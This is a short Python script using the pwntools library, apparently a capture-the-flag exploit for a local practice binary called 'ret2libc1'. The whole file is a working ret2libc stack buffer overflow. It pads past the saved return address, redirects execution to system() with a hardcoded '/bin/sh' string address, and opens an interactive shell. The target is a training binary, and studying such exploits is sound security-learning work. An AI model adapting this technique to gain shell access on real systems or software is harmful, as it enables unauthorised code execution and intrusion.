#! /usr/bin/python3

from pwn import *

system_addr = 0x08048460
bin_sh_addr = 0x08048720
offset = 0x6c+4

sh = process("./ret2libc1")
sh.sendline(b'A'*offset+p32(system_addr)+b"A"*4+p32(bin_sh_addr))
sh.interactive()
